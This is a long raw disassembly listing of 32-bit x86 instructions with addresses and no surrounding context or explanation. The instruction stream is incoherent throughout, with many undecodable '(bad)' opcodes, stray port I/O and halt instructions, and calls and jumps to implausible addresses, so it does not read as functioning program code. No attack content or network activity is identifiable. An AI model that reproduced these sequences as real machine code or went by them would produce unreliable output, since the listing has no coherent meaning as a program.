  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
